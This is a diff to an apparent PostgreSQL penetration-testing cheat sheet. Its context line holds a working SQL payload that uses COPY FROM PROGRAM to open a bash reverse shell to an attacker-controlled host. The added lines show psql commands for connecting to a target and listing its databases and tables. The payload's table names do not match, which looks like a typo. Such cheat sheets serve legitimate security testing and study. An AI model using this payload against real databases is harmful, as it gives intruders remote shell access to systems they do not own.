@@ -156,3 +156,16 @@ Reverse shell via command injection option:
 ```sql
 CREATE TABLE cmd_execit(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1\"'
 ```
+
+```sh
+psql -U $USER -h $TARGET_IP -p $PORT
+```
+and then:
+```
+\l
+#list databases
+\c $DB_NAME
+#select database
+\dt
+#display tables in database
+```
